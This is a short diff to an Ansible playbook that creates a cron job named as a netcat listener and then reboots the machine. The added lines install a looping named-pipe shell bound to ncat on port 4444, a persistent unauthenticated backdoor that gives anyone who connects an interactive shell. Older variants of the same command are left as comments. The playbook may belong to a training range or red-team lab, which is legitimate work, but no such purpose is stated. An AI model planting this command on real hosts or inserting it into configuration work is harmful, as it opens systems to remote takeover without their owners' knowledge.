@@ -11,7 +11,9 @@
 - name: Create netcat listener cron job
   ansible.builtin.import_playbook: ../common/cronJob.yml
   vars:
-    job_cmd: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|while true; do ncat -lnvp 4444 -e /bin/bash >/tmp/f; done"
+    # job_cmd: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|while true; do ncat -lnvp 4444 -e /bin/bash >/tmp/f; done"
+    #job_cmd: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -lnvp 4444 >/tmp/f"
+    job_cmd: "while true; do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -lnvp 4444 >/tmp/f; done"
 
 - name: Reboot machine
   ansible.builtin.import_playbook: ../common/reboot.yml
